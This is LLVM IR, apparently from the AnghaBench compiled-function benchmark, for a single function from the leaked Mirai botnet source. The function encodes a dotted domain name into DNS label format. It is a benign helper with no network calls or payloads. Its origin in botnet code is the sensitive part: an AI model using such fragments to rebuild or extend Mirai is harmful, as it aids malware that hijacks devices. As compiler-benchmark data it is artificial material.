; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_resolv.c_resolv_domain_to_hostname.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_resolv.c_resolv_domain_to_hostname.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @resolv_domain_to_hostname(i8* %0, i8* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %10 = load i8*, i8** %4, align 8
  %11 = call i32 @util_strlen(i8* %10)
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %5, align 4
  %13 = load i8*, i8** %3, align 8
  store i8* %13, i8** %6, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  store i8* %15, i8** %7, align 8
  store i8 0, i8* %8, align 1
  br label %16

16:                                               ; preds = %42, %2
  %17 = load i32, i32* %5, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %5, align 4
  %19 = icmp sgt i32 %17, 0
  br i1 %19, label %20, label %43

20:                                               ; preds = %16
  %21 = load i8*, i8** %4, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %4, align 8
  %23 = load i8, i8* %21, align 1
  store i8 %23, i8* %9, align 1
  %24 = load i8, i8* %9, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 46
  br i1 %26, label %31, label %27

27:                                               ; preds = %20
  %28 = load i8, i8* %9, align 1
  %29 = sext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

31:                                               ; preds = %27, %20
  %32 = load i8, i8* %8, align 1
  %33 = load i8*, i8** %6, align 8
  store i8 %32, i8* %33, align 1
  %34 = load i8*, i8** %7, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %7, align 8
  store i8* %34, i8** %6, align 8
  store i8 0, i8* %8, align 1
  br label %42

36:                                               ; preds = %27
  %37 = load i8, i8* %8, align 1
  %38 = add i8 %37, 1
  store i8 %38, i8* %8, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load i8*, i8** %7, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %7, align 8
  store i8 %39, i8* %40, align 1
  br label %42

42:                                               ; preds = %36, %31
  br label %16

43:                                               ; preds = %16
  %44 = load i8*, i8** %7, align 8
  store i8 0, i8* %44, align 1
  ret void
}

declare dso_local i32 @util_strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
